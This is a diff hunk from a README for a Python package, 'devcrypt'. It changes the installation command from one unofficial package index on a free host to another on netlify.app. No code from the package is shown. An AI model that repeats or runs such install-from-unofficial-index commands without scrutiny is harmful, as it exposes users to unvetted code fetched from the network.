@@ -41,7 +41,7 @@ decoded = dc.devanagari_decode(encoded)
 ## 📦 Installation
 
 ```bash
-pip install -i https://crypthera.free.nf/simple/ devcrypt
+pip install --index-url https://devcrypts.netlify.app/simple/ devcrypt
 ```
 
 ---
